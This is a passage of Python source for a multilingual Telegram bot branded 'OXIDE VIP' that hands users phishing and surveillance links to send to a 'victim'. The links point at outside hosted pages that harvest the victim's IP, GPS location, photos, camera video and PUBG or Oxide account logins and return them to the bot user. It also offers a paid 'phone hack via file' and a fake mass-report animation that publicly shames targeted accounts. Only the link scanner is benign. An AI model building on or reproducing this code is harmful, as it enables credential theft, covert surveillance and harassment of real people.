        'video_msg': '📹 لینک ضبط دوربین:\n{link}\n\nاین لینک را برای قربانی بفرستید.\n۵ ثانیه ویدیو ضبط شده و برای شما فرستاده می‌شود.',
        'pubg_msg': '🚀 لینک هک PUBG:\n{link}\n\nاین لینک را برای قربانی بفرستید.\nاطلاعات حساب PUBG از طریق ربات برای شما ارسال می‌شود.',
        'oxide_msg': '🚀 لینک هک Oxide:\n{link}\n\nاین لینک را برای قربانی بفرستید.\nبعد از ثبت‌نام، اطلاعات فوری برای شما ارسال می‌شود.',
        'phone_need_pts': '✅📱 هک گوشی از طریق فایل\n\n⛔️ برای این ویژگی به ۵۰۰۰ امتیاز نیاز دارید.\n🎯 امتیازات شما: {pts}\n\nدر قرعه‌کشی روزانه شرکت کنید!',
        'phone_ok': '✅ ۵۰۰۰ امتیاز کسر شد.\nموجودی: {pts} امتیاز\n\n📎 لینک هک:\n{link}',
        'lottery_done': '🎰 امروز در قرعه‌کشی شرکت کرده‌اید.\nفردا بیایید! ⏰',
        'lottery_win': '🎰 قرعه‌کشی روزانه\n\n🎉 تبریک! {prize} امتیاز بردید!\n💰 موجودی کل: {total} امتیاز\n\nفردا بیایید! 🌙',
        'points_msg': '🎯 امتیازات من\n\n💰 موجودی فعلی: {pts} امتیاز\n🎯 برای هک فایل به {need} امتیاز بیشتر نیاز دارید',
        'report_enter': '💀 نام کاربری مورد گزارش را ارسال کنید:\n(مثال: @username)',
        'report_wait': 'یک لحظه ☠️',
        'report_select_type': '⚠️ لطفاً نوع گزارش را انتخاب کنید:',
        'report_success': '✅ گزارش با موفقیت ارسال شد!\n\n📊 نتیجه نهایی:\n✅ گزارش‌های موفق: {ok}\n❌ گزارش‌های ناموفق: {fail}\n\n☠️ حساب {user} با موفقیت گزارش شد',
        'report_header': '📊 آمار گزارش - {type}',
        'report_processing': '⏳ در حال پردازش گزارش‌ها...',
        'report_ok_lbl': 'موفق',
        'report_fail_lbl': 'ناموفق',
        'report_types': ['محتوای پورن','خشونت','محتوای غیرقانونی','کلاهبرداری','محتوای تروریستی','استثمار کودکان','جعل هویت','محتوای نفرت‌انگیز','فیشینگ','مواد مخدر','نقض حریم خصوصی','اسپم'],
        'features_text': 'ℹ️ راهنمای ویژگی‌ها:\n\n📱 اطلاعات دستگاه — IP، GPS، باتری.\n\n🖼 عکس‌ها — گالری قربانی.\n\n📹 ویدیو — ۵ ثانیه ضبط.\n\n🚀 PUBG — اطلاعات حساب.\n\n🚀 Oxide — بعد از ثبت‌نام.\n\n✅ هک فایل — ۵۰۰۰ امتیاز.\n\n🎰 قرعه‌کشی — روزی یک بار.\n\n🎯 امتیازات — موجودی.',
    },
}

def t(key, lang='ar'):
    return T.get(lang, T['ar']).get(key, T['ar'].get(key, key))

# ==================== مساعد ====================
def is_user_subscribed(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return True  # إذا صار خطأ بالتحقق، اسمح للمستخدم يكمل

def send_sub_required(user_id, lang):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton(t('btn_join', lang), url=f"https://t.me/{CHANNEL_USERNAME.lstrip('@')}"))
    markup.add(types.InlineKeyboardButton(t('btn_check_sub', lang), callback_data="check_sub"))
    bot.send_message(user_id, t('sub_required', lang), reply_markup=markup)

def get_back_markup(lang):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton(t('btn_back', lang), callback_data="back_to_menu"))
    return markup

def get_main_menu(lang='ar'):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton(t('btn_device', lang), callback_data="get_device_info"))
    markup.add(types.InlineKeyboardButton(t('btn_video', lang), callback_data="capture_video"))
    markup.add(types.InlineKeyboardButton(t('btn_pubg', lang), callback_data="hack_pubg"))
    markup.add(types.InlineKeyboardButton(t('btn_oxide', lang), callback_data="hack_oxide"))
    markup.add(types.InlineKeyboardButton(t('btn_phone_file', lang), callback_data="hack_phone_file"))
    markup.add(types.InlineKeyboardButton(t('btn_lottery', lang), callback_data="daily_lottery"))
    markup.add(types.InlineKeyboardButton(t('btn_points', lang), callback_data="my_points"))
    markup.add(types.InlineKeyboardButton(t('btn_report', lang), callback_data="report_user"))
    markup.add(types.InlineKeyboardButton(t('btn_scan', lang), callback_data="scan_link"))
    markup.add(types.InlineKeyboardButton(t('btn_contact', lang), url=DEVELOPER_URL))
    markup.add(types.InlineKeyboardButton(t('btn_features', lang), callback_data="features_info"))
    return markup

def get_lang(user_id):
    return user_lang.get(user_id, 'ar')

def scrape_tg_profile(username):
    """جلب معلومات الحساب من صفحة t.me العامة — يشتغل لأي حساب عام"""
    try:
        uname = username.lstrip('@')
        url = f"https://t.me/{uname}"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        r = requests.get(url, headers=headers, timeout=10)
        if r.status_code != 200:
            return "", "", None
        html = r.text
        name = ""
        m = re.search(r'<meta property="og:title" content="([^"]+)"', html)
        if m:
            name = m.group(1).strip()
        bio = ""
        m = re.search(r'<meta property="og:description" content="([^"]+)"', html)
        if m:
            bio = m.group(1).strip()
        photo_url = None
        m = re.search(r'<meta property="og:image" content="([^"]+)"', html)
        if m:
            photo_url = m.group(1).strip()
        return name, bio, photo_url
    except Exception:
        return "", "", None

# ترجمات ألافتات في قسم الملف الشخصي
PROFILE_LABELS = {
    'ar': {'header': 'هل هذا هو الحساب ☠️', 'username': '💠 يوزر الحساب', 'name': '🔸 اسم الحساب', 'created': '📅 تاريخ الإنشاء', 'bio': '🔗 الوصف', 'link': '👤 رابط الحساب', 'na': 'غير متوفر', 'report_title': '🔴 الإبلاغ عن الحساب'},
    'en': {'header': 'Is this the account? ☠️', 'username': '💠 Username', 'name': '🔸 Account Name', 'created': '📅 Created', 'bio': '🔗 Bio', 'link': '👤 Account Link', 'na': 'Not available', 'report_title': '🔴 Report Account'},
    'ru': {'header': 'Это тот аккаунт? ☠️', 'username': '💠 Пользователь', 'name': '🔸 Имя аккаунта', 'created': '📅 Дата создания', 'bio': '🔗 Описание', 'link': '👤 Ссылка', 'na': 'Недоступно', 'report_title': '🔴 Пожаловаться'},
    'tr': {'header': 'Bu hesap mı? ☠️', 'username': '💠 Kullanıcı adı', 'name': '🔸 Hesap Adı', 'created': '📅 Oluşturulma', 'bio': '🔗 Biyografi', 'link': '👤 Hesap Linki', 'na': 'Mevcut değil', 'report_title': '🔴 Hesabı Şikayet Et'},
    'de': {'header': 'Ist das das Konto? ☠️', 'username': '💠 Benutzername', 'name': '🔸 Kontoname', 'created': '📅 Erstellt', 'bio': '🔗 Bio', 'link': '👤 Kontolink', 'na': 'Nicht verfügbar', 'report_title': '🔴 Konto melden'},
    'uk': {'header': 'Це той акаунт? ☠️', 'username': '💠 Користувач', 'name': '🔸 Назва акаунту', 'created': '📅 Дата створення', 'bio': '🔗 Опис', 'link': '👤 Посилання', 'na': 'Недоступно', 'report_title': '🔴 Поскаржитись'},
    'zh': {'header': '这是该账号吗？☠️', 'username': '💠 用户名', 'name': '🔸 账号名称', 'created': '📅 创建时间', 'bio': '🔗 简介', 'link': '👤 账号链接', 'na': '不可用', 'report_title': '🔴 举报账号'},
    'fa': {'header': 'آیا این حساب است؟ ☠️', 'username': '💠 نام کاربری', 'name': '🔸 نام حساب', 'created': '📅 تاریخ ایجاد', 'bio': '🔗 بیوگرافی', 'link': '👤 لینک حساب', 'na': 'در دسترس نیست', 'report_title': '🔴 گزارش حساب'},
}

# ==================== ترجمات فحص الروابط ====================
SCAN_LABELS = {
    'ar': {
        'safe': '✅ آمن', 'danger': '🔴 خطير جداً', 'phishing': '🟠 تصيد احتيالي', 'unknown': '⚠️ غير معروف',
        'url_lbl': 'الرابط', 'class_lbl': 'التصنيف', 'details_lbl': 'تفاصيل التصنيف',
        'ip_lbl': 'معلومات IP', 'isp_lbl': 'مزود الخدمة',
        'detail_safe': 'الرابط آمن ولم يُرصد في قواعد بيانات التهديدات.',
        'detail_danger': 'تم اكتشاف الكثير من البرمجيات الخبيثة التي يمكن أن تخترقك. الرجاء عدم الدخول للرابط والحذر من التعامل مع الشخص الذي أرسله.',
        'detail_phishing': 'هذا الرابط يُستخدم للتصيد الاحتيالي وسرقة بياناتك الشخصية.',
        'detail_unknown': 'لم يتم العثور على معلومات كافية لتقييم هذا الرابط.',
    },
    'en': {
        'safe': '✅ Safe', 'danger': '🔴 Very Dangerous', 'phishing': '🟠 Phishing', 'unknown': '⚠️ Unknown',
        'url_lbl': 'URL', 'class_lbl': 'Classification', 'details_lbl': 'Classification Details',
        'ip_lbl': 'IP Information', 'isp_lbl': 'Service Provider',
        'detail_safe': 'The URL is safe and was not found in any threat databases.',
        'detail_danger': 'Many malicious programs detected that can compromise your device. Do not open this link.',
        'detail_phishing': 'This URL is used for phishing attacks to steal your personal data.',
        'detail_unknown': 'Not enough information to evaluate this URL.',
    },
    'ru': {
        'safe': '✅ Безопасно', 'danger': '🔴 Очень опасно', 'phishing': '🟠 Фишинг', 'unknown': '⚠️ Неизвестно',
        'url_lbl': 'Ссылка', 'class_lbl': 'Классификация', 'details_lbl': 'Детали',
        'ip_lbl': 'IP информация', 'isp_lbl': 'Провайдер',
        'detail_safe': 'Ссылка безопасна и не обнаружена в базах угроз.',
        'detail_danger': 'Обнаружено вредоносное ПО. Не открывайте эту ссылку.',
        'detail_phishing': 'Эта ссылка используется для фишинга и кражи данных.',
        'detail_unknown': 'Недостаточно информации для оценки этой ссылки.',
    },
    'tr': {
        'safe': '✅ Güvenli', 'danger': '🔴 Çok Tehlikeli', 'phishing': '🟠 Kimlik Avı', 'unknown': '⚠️ Bilinmiyor',
        'url_lbl': 'Bağlantı', 'class_lbl': 'Sınıflandırma', 'details_lbl': 'Ayrıntılar',
        'ip_lbl': 'IP Bilgisi', 'isp_lbl': 'Servis Sağlayıcı',
        'detail_safe': 'Bağlantı güvenlidir ve tehdit veritabanlarında bulunamadı.',
        'detail_danger': 'Zararlı yazılım tespit edildi. Bu bağlantıyı açmayın.',
        'detail_phishing': 'Bu bağlantı kimlik avı için kullanılıyor.',
        'detail_unknown': 'Bu bağlantıyı değerlendirmek için yeterli bilgi yok.',
    },
    'de': {
        'safe': '✅ Sicher', 'danger': '🔴 Sehr gefährlich', 'phishing': '🟠 Phishing', 'unknown': '⚠️ Unbekannt',
        'url_lbl': 'Link', 'class_lbl': 'Klassifikation', 'details_lbl': 'Details',
        'ip_lbl': 'IP-Information', 'isp_lbl': 'Anbieter',
        'detail_safe': 'Der Link ist sicher und wurde in keiner Bedrohungsdatenbank gefunden.',
        'detail_danger': 'Schadsoftware erkannt. Öffne diesen Link nicht.',
        'detail_phishing': 'Dieser Link wird für Phishing-Angriffe verwendet.',
        'detail_unknown': 'Nicht genug Informationen, um diesen Link zu bewerten.',
    },
    'uk': {
        'safe': '✅ Безпечно', 'danger': '🔴 Дуже небезпечно', 'phishing': '🟠 Фішинг', 'unknown': '⚠️ Невідомо',
        'url_lbl': 'Посилання', 'class_lbl': 'Класифікація', 'details_lbl': 'Деталі',
        'ip_lbl': 'IP інформація', 'isp_lbl': 'Провайдер',
        'detail_safe': 'Посилання безпечне і не знайдено в базах загроз.',
        'detail_danger': 'Виявлено шкідливе ПЗ. Не відкривайте це посилання.',
        'detail_phishing': 'Це посилання використовується для фішингу.',
        'detail_unknown': 'Недостатньо інформації для оцінки посилання.',
    },
    'zh': {
        'safe': '✅ 安全', 'danger': '🔴 非常危险', 'phishing': '🟠 网络钓鱼', 'unknown': '⚠️ 未知',
        'url_lbl': '链接', 'class_lbl': '分类', 'details_lbl': '详情',
        'ip_lbl': 'IP信息', 'isp_lbl': '服务提供商',
        'detail_safe': '该链接是安全的，未在任何威胁数据库中发现。',
        'detail_danger': '检测到恶意软件。请勿打开此链接。',
        'detail_phishing': '此链接用于网络钓鱼攻击。',
        'detail_unknown': '没有足够的信息来评估此链接。',
    },
    'fa': {
        'safe': '✅ امن', 'danger': '🔴 بسیار خطرناک', 'phishing': '🟠 فیشینگ', 'unknown': '⚠️ ناشناخته',
        'url_lbl': 'لینک', 'class_lbl': 'طبقه‌بندی', 'details_lbl': 'جزئیات',
        'ip_lbl': 'اطلاعات IP', 'isp_lbl': 'ارائه‌دهنده',
        'detail_safe': 'لینک امن است و در هیچ پایگاه داده تهدیدی یافت نشد.',
        'detail_danger': 'بدافزار شناسایی شد. این لینک را باز نکنید.',
        'detail_phishing': 'این لینک برای حملات فیشینگ استفاده می‌شود.',
        'detail_unknown': 'اطلاعات کافی برای ارزیابی این لینک وجود ندارد.',
    },
}

# ==================== وظائف فحص الروابط ====================
def extract_domain(url):
    try:
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        return urlparse(url).netloc or url
    except:
        return url

def get_ip_info(domain):
    try:
        ip = socket.gethostbyname(domain)
        r = requests.get(f'https://ipapi.co/{ip}/json/', timeout=6)
        data = r.json()
        return ip, data.get('org', 'Unknown')
    except:
        return None, None

def check_urlhaus(url):
    try:
        r = requests.post('https://urlhaus-api.abuse.ch/v1/url/',
                          data={'url': url}, timeout=10)
        data = r.json()
        if data.get('query_status') == 'is_available':
            return 'danger'
        return 'clean'
    except:
        return 'unknown'

def check_phishtank(url):
    try:
        r = requests.post(
            'https://checkurl.phishtank.com/checkurl/',
            data={'url': url, 'format': 'json'},
            headers={'User-Agent': 'phishtank/scanbot'},
            timeout=10
        )
        return r.json().get('results', {}).get('in_database', False)
    except:
        return False

def run_scan_link(user_id, url, lang, wait_msg_id):
    sl = SCAN_LABELS.get(lang, SCAN_LABELS['ar'])
    time.sleep(1.5)

    domain = extract_domain(url)
    ip, isp = get_ip_info(domain)
    urlhaus = check_urlhaus(url)
    phishtank = check_phishtank(url)

    if phishtank:
        verdict = sl['phishing']
        detail = sl['detail_phishing']
    elif urlhaus == 'danger':
        verdict = sl['danger']
        detail = sl['detail_danger']
    elif urlhaus == 'clean':
        verdict = sl['safe']
        detail = sl['detail_safe']
    else:
        verdict = sl['unknown']
        detail = sl['detail_unknown']

    lines = [
        f"• {sl['url_lbl']}: {url}",
        "",
        f"• {sl['class_lbl']}: {verdict}",
        "",
        f"• {sl['details_lbl']}: {detail}",
    ]
    if ip:
        lines += ["", f"• {sl['ip_lbl']}: {ip}"]
    if isp:
        lines += ["", f"• {sl['isp_lbl']}: {isp}"]

    text = '\n'.join(lines)
    try:
        bot.edit_message_text(text, user_id, wait_msg_id, reply_markup=get_back_markup(lang))
    except:
        bot.send_message(user_id, text, reply_markup=get_back_markup(lang))

# ==================== انيميشن البلاغ ====================
def run_report_animation(user_id, username, report_type_label, lang):
    total_reports = random.randint(110, 145)
    success = 0
    failed = 0

    # رسالة الرأس — مترجمة
    bot.send_message(user_id, t('report_header', lang).format(type=report_type_label))

    # رسالة التقدم التي سنعدّل عليها
    try:
        prog_msg = bot.send_message(user_id, t('report_processing', lang))
    except:
        return

    sent = 0
    update_every = max(1, total_reports // 20)
    ok_lbl = t('report_ok_lbl', lang)
    fail_lbl = t('report_fail_lbl', lang)

    for i in range(1, total_reports + 1):
        if random.random() < 0.87:
            success += 1
        else:
            failed += 1
        sent += 1

        if sent % update_every == 0 or i == total_reports:
            try:
                pending = total_reports - i
                text = f"{i} | {pending} | ✅ {ok_lbl}: {success} | ❌ {fail_lbl}: {failed}"
                bot.edit_message_text(text, user_id, prog_msg.message_id)
                time.sleep(0.25)
            except:
                time.sleep(0.1)

    # رسالة الإنهاء — مترجمة
    time.sleep(0.4)
    final_text = t('report_success', lang).format(ok=success, fail=failed, user=username)
    try:
        bot.send_message(user_id, final_text, reply_markup=get_back_markup(lang))
    except:
        pass

    # إشعار الأدمن مع أزرار الموافقة والرفض
    try:
        safe_user = username.lstrip('@')[:30]
        admin_text = (
            f"📢 بلاغ جديد — بانتظار موافقتك\n\n"
            f"👤 المُبلَّغ عنه: {username}\n"
            f"📌 نوع البلاغ: {report_type_label}\n"
            f"🕵️ المُبلِّغ: ID {user_id}\n\n"
            f"✅ ناجحة: {success} | ❌ فاشلة: {failed}"
        )
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton("✅ موافق للنشر", callback_data=f"approve_{safe_user}"),
            types.InlineKeyboardButton("❌ رفض", callback_data=f"reject_{safe_user}")
        )
        bot.send_message(ADMIN_ID, admin_text, reply_markup=markup)
    except:
        pass

# ==================== لوحة الأدمن ====================
@bot.message_handler(commands=['admin'])
def admin_panel(message):
    user_id = message.chat.id
    if user_id != ADMIN_ID:
        return

    uptime = datetime.datetime.now() - bot_start_time
    hours, rem = divmod(int(uptime.total_seconds()), 3600)
    minutes, seconds = divmod(rem, 60)

    lang_count = {}
    for uid, lg in user_lang.items():
        lang_count[lg] = lang_count.get(lg, 0) + 1

    lang_flags = {'ar': '🇸🇦', 'en': '🇺🇸', 'ru': '🇷🇺', 'tr': '🇹🇷', 'de': '🇩🇪', 'uk': '🇺🇦', 'zh': '🇨🇳', 'fa': '🇮🇷'}
    lang_lines = '\n'.join(
        f"  {lang_flags.get(lg,'🌐')} {lg.upper()}: {cnt}"
        for lg, cnt in sorted(lang_count.items(), key=lambda x: -x[1])
    ) or '  لا يوجد'

    stats_lines = '\n'.join(
        f"  {name}: {cnt}"
        for name, cnt in sorted(feature_stats.items(), key=lambda x: -x[1])
    ) or '  لا يوجد'

    text = (
        f"╔══════════════════════╗\n"
        f"║   👑  لوحة الأدمن   ║\n"
        f"╚══════════════════════╝\n\n"
        f"👥 إجمالي المستخدمين: {len(all_users)}\n"
        f"🌐 المستخدمون النشطون (لغة محددة): {len(user_lang)}\n"
        f"⏳ الجلسات النشطة حالياً: {len(user_states)}\n"
        f"⏱️ وقت التشغيل: {hours}س {minutes}د {seconds}ث\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📊 توزيع اللغات:\n{lang_lines}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔥 الميزات الأكثر استخداماً:\n{stats_lines}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📅 تاريخ اليوم: {datetime.date.today().isoformat()}"
    )
    bot.send_message(user_id, text)

# ==================== /start ====================
WELCOME_IMAGE = "https://t4.ftcdn.net/jpg/17/10/89/71/360_F_1710897186_iHRZRqF0gixOip53HtTqn7p2XGwd8bEv.jpg"

WELCOME_TEXT = """
╔══════════════════════════╗
║   ⚡  O X I D E  V I P  ⚡   ║
╚══════════════════════════╝

🔥 Welcome to the most powerful
    intelligence bot on Telegram.

━━━━━━━━━━━━━━━━━━━━━━━━━
🛡️  W H A T  I  C A N  D O :
━━━━━━━━━━━━━━━━━━━━━━━━━

📱  Track device info & real GPS location
📹  Remote camera capture link
🔗  Scan links for malware & phishing
💀  Report & expose suspicious accounts
🎰  Daily lottery & reward points system
🚀  PUBG account intelligence tool

━━━━━━━━━━━━━━━━━━━━━━━━━
🔒  Fast  •  Secure  •  Anonymous
━━━━━━━━━━━━━━━━━━━━━━━━━

         Powered by @OxideV2INFO
"""

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.chat.id
    user_lang.pop(user_id, None)
    user_states.pop(user_id, None)
    all_users.add(user_id)

    try:
        bot.send_photo(user_id, photo=WELCOME_IMAGE, caption=WELCOME_TEXT)
    except:
        bot.send_message(user_id, WELCOME_TEXT)

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🇸🇦 العربية", callback_data="lang_ar"))
    markup.add(types.InlineKeyboardButton("🇺🇸 English", callback_data="lang_en"))
    markup.add(types.InlineKeyboardButton("🇷🇺 Русский", callback_data="lang_ru"))
    markup.add(types.InlineKeyboardButton("🇹🇷 Türkçe", callback_data="lang_tr"))
    markup.add(types.InlineKeyboardButton("🇩🇪 Deutsch", callback_data="lang_de"))
    markup.add(types.InlineKeyboardButton("🇺🇦 Українська", callback_data="lang_uk"))
    markup.add(types.InlineKeyboardButton("🇨🇳 中文", callback_data="lang_zh"))
    markup.add(types.InlineKeyboardButton("🇮🇷 فارسی", callback_data="lang_fa"))
    bot.send_message(user_id, "👋 Please select your language / يرجى اختيار اللغة:", reply_markup=markup)

# ==================== رسائل نصية ====================
@bot.message_handler(func=lambda message: True)
def handle_messages(message):
    user_id = message.chat.id
    lang = get_lang(user_id)
    state = user_states.get(user_id)

    if state == 'waiting_scan_link':
        url = message.text.strip()
        user_states.pop(user_id, None)
        wait_msg = bot.send_message(user_id, t('scan_wait', lang))
        threading.Thread(
            target=run_scan_link,
            args=(user_id, url, lang, wait_msg.message_id),
            daemon=True
        ).start()
        return

    if state == 'waiting_report_username':
        username = message.text.strip()
        if not username.startswith('@'):
            username = '@' + username
        user_states[user_id] = {'state': 'waiting_report_type', 'username': username}

        # "لحضه وحده"
        bot.send_message(user_id, t('report_wait', lang))

        # جلب معلومات المستخدم
        uname_clean = username.lstrip('@')
        full_name = ""
        bio_text = ""
        photo_file_id = None
        photo_url_web = None
        chat_id_for_photo = None

        # ── المحاولة الأولى: Bot API (تنجح إذا كان الحساب عاماً أو تحدّث مع البوت) ──
        try:
            chat_info = bot.get_chat(username)
            chat_id_for_photo = chat_info.id
            try:
                full_name = chat_info.title or ""
            except Exception:
                full_name = ""
            if not full_name:
                try:
                    fname = chat_info.first_name or ""
                    lname = getattr(chat_info, 'last_name', '') or ""
                    full_name = f"{fname} {lname}".strip()
                except Exception:
                    pass
            try:
                bio_text = chat_info.description or ""
            except Exception:
                bio_text = ""
            if not bio_text:
                try:
                    bio_text = getattr(chat_info, 'bio', '') or ""
                except Exception:
                    pass
            try:
                if chat_info.username:
                    uname_clean = chat_info.username
            except Exception:
                pass
            try:
                if chat_info.photo:
                    photo_file_id = chat_info.photo.big_file_id
            except Exception:
                pass
            if not photo_file_id and chat_id_for_photo:
                try:
                    photos = bot.get_user_profile_photos(chat_id_for_photo, limit=1)
                    if photos.total_count > 0:
                        photo_file_id = photos.photos[0][-1].file_id
                except Exception:
                    pass
        except Exception:
            pass

        # ── المحاولة الثانية: Scraping من t.me إذا لم تنجح الأولى ──
        if not full_name or not bio_text or not photo_file_id:
            s_name, s_bio, s_photo = scrape_tg_profile(uname_clean)
            if not full_name and s_name:
                full_name = s_name
            if not bio_text and s_bio:
                bio_text = s_bio
            if not photo_file_id and s_photo:
                photo_url_web = s_photo

        # لافتات مترجمة حسب لغة المستخدم
        pl = PROFILE_LABELS.get(lang, PROFILE_LABELS['ar'])
        na = pl['na']

        info_caption = (
            f"{pl['header']}\n\n"
            f"{pl['username']}: @{uname_clean}\n"
            f"{pl['name']}: {full_name if full_name else na}\n"
            f"{pl['created']}: {na}\n"
            f"{pl['bio']}: {bio_text[:300] if bio_text else na}\n"
            f"{pl['link']}: https://t.me/{uname_clean}"
        )

        # ── إرسال البروفايل (صورة أو نص) بدون أزرار ──
        sent_photo = False
        caption_safe = info_caption[:1024]  # حد تيليغرام للكابشن
        if photo_file_id:
            try:
                bot.send_photo(user_id, photo_file_id, caption=caption_safe)
                sent_photo = True
            except Exception:
                pass
        if not sent_photo and photo_url_web:
            try:
                resp = requests.get(photo_url_web, timeout=10)
                if resp.status_code == 200:
                    img_bytes = io.BytesIO(resp.content)
                    img_bytes.name = "profile.jpg"
                    bot.send_photo(user_id, img_bytes, caption=caption_safe)
                    sent_photo = True
            except Exception:
                pass
        if not sent_photo:
            bot.send_message(user_id, info_caption, disable_web_page_preview=True)

        # ── رسالة منفصلة فيها زر البلاغ فقط (مثل الصورة) ──
        report_btn_markup = types.InlineKeyboardMarkup()
        report_btn_markup.add(types.InlineKeyboardButton(f"💀 {pl['report_title']}", callback_data="do_report"))
        report_btn_markup.add(types.InlineKeyboardButton(t('btn_back', lang), callback_data="back_to_menu"))
        bot.send_message(user_id, f"☠️", reply_markup=report_btn_markup)

# ==================== أزرار ====================
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    user_id = call.message.chat.id
    bot.answer_callback_query(call.id)

    # اختيار اللغة
    if call.data.startswith("lang_"):
        lang = call.data.split("_")[1]
        user_lang[user_id] = lang
        user_states.pop(user_id, None)
        # التحقق من الاشتراك عند الدخول
        if not is_user_subscribed(user_id):
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton(t('btn_join', lang), url=f"https://t.me/{CHANNEL_USERNAME.lstrip('@')}"))
            markup.add(types.InlineKeyboardButton(t('btn_check_sub', lang), callback_data="check_sub"))
            bot.edit_message_text(
                chat_id=user_id,
                message_id=call.message.message_id,
                text=t('sub_required', lang),
                reply_markup=markup
            )
        else:
            bot.edit_message_text(
                chat_id=user_id,
                message_id=call.message.message_id,
                text=t('welcome', lang),
                reply_markup=get_main_menu(lang)
            )
        return

    lang = get_lang(user_id)

    # رجوع
    if call.data == "back_to_menu":
        user_states.pop(user_id, None)
        bot.send_message(user_id, t('home_menu', lang), reply_markup=get_main_menu(lang))
        return

    # تحقق اشتراك
    if call.data == "check_sub":
        if is_user_subscribed(user_id):
            bot.send_message(user_id, t('sub_ok', lang), reply_markup=get_main_menu(lang))
        else:
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton(t('btn_join', lang), url=f"https://t.me/{CHANNEL_USERNAME.lstrip('@')}"))
            markup.add(types.InlineKeyboardButton(t('btn_check_sub', lang), callback_data="check_sub"))
            bot.send_message(user_id, t('sub_fail', lang), reply_markup=markup)
        return

    # موافقة الأدمن
    if call.data.startswith("approve_"):
        username = call.data.replace("approve_", "")
        try:
            bot.send_message(
                CHANNEL_USERNAME,
                f"🚨 تم الإبلاغ عن الحساب @{username} بنجاح من قبل مستخدمي البوت."
            )
        except:
            pass
        try:
            bot.edit_message_text(
                f"✅ تمت الموافقة ونُشر البلاغ ضد @{username} في القناة.",
                call.message.chat.id,
                call.message.message_id
            )
        except:
            pass
        return

    if call.data.startswith("reject_"):
        username = call.data.replace("reject_", "")
        try:
            bot.edit_message_text(
                f"❌ تم رفض البلاغ ضد @{username}.",
                call.message.chat.id,
                call.message.message_id
            )
        except:
            pass
        return

    # زر "الإبلاغ عن الحساب" — يظهر أنواع البلاغات
    if call.data == "do_report":
        state_data = user_states.get(user_id, {})
        username = state_data.get('username', '') if isinstance(state_data, dict) else ''
        report_types = t('report_types', lang)
        pl = PROFILE_LABELS.get(lang, PROFILE_LABELS['ar'])
        markup = types.InlineKeyboardMarkup()
        for rt in report_types:
            safe = rt.replace(' ', '_')[:20]
            markup.add(types.InlineKeyboardButton(rt, callback_data=f"rtype_{safe}"))
        markup.add(types.InlineKeyboardButton(t('btn_back', lang), callback_data="back_to_menu"))
        bot.send_message(user_id, f"{pl['report_title']}\n\n{t('report_select_type', lang)}", reply_markup=markup)
        return

    # نوع البلاغ — تشغيل الانيميشن في خيط منفصل
    if call.data.startswith("rtype_"):
        state_data = user_states.get(user_id, {})
        username = state_data.get('username', '') if isinstance(state_data, dict) else ''
        user_states.pop(user_id, None)
        report_type_label = call.data.replace("rtype_", "").replace("_", " ")

        thread = threading.Thread(
            target=run_report_animation,
            args=(user_id, username, report_type_label, lang),
            daemon=True
        )
        thread.start()
        return

    # ===== التحقق من الاشتراك لجميع الميزات =====
    if not is_user_subscribed(user_id):
        send_sub_required(user_id, lang)
        return

    # ===== تتبع الميزات =====
    tracked = {
        'get_device_info': '📱 معلومات الجهاز',
        'scan_link': '🔗 فحص الروابط',
        'capture_video': '📹 تصوير الكاميرا',
        'hack_pubg': '🚀 اختراق PUBG',
        'hack_oxide': '💀 اختراق Oxide',
        'hack_phone_file': '📁 ملف الهاتف',
        'daily_lottery': '🎰 اليانصيب',
        'my_points': '🎯 نقاطي',
        'report_user': '💀 بلاغ',
    }
    if call.data in tracked:
        feature_stats[tracked[call.data]] = feature_stats.get(tracked[call.data], 0) + 1

    # ===== سحب معلومات الجهاز =====
    if call.data == "get_device_info":
        link = f"{TRACK_URL}?id={user_id}"
        bot.send_message(user_id, t('device_msg', lang).format(link=link), reply_markup=get_back_markup(lang))

    # ===== فحص الروابط =====
    elif call.data == "scan_link":
        user_states[user_id] = 'waiting_scan_link'
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton(t('btn_back', lang), callback_data="back_to_menu"))
        bot.send_message(user_id, t('scan_enter', lang), reply_markup=markup)

    # ===== التقاط فيديو =====
    elif call.data == "capture_video":
        link = f"https://comfy-longma-084aea.netlify.app/?chat_id={user_id}"
        bot.send_message(user_id, t('video_msg', lang).format(link=link), reply_markup=get_back_markup(lang))

    # ===== اختراق ببجي =====
    elif call.data == "hack_pubg":
        link = f"https://singular-llama-90e6a9.netlify.app/?id={user_id}"
        bot.send_message(user_id, t('pubg_msg', lang).format(link=link), reply_markup=get_back_markup(lang))

    # ===== اختراق أوكسايد =====
    elif call.data == "hack_oxide":
        link = f"https://comforting-liger-969c81.netlify.app/?id={user_id}"
        bot.send_message(user_id, t('oxide_msg', lang).format(link=link), reply_markup=get_back_markup(lang))

    # ===== اختراق الهاتف عبر ملف =====
    elif call.data == "hack_phone_file":
        pts = user_points.get(user_id, 0)
        if pts < 5000:
            bot.send_message(user_id, t('phone_need_pts', lang).format(pts=pts), reply_markup=get_back_markup(lang))
        else:
            user_points[user_id] = pts - 5000
            link = f"{TRACK_URL}?mode=file&id={user_id}"
            bot.send_message(user_id, t('phone_ok', lang).format(pts=user_points[user_id], link=link), reply_markup=get_back_markup(lang))

    # ===== اليانصيب اليومي =====
    elif call.data == "daily_lottery":
        today = datetime.date.today().isoformat()
        if user_last_lottery.get(user_id) == today:
            bot.send_message(user_id, t('lottery_done', lang), reply_markup=get_back_markup(lang))
        else:
            user_last_lottery[user_id] = today
            prize = random.choice([50, 100, 150, 200, 250, 500, 1000])
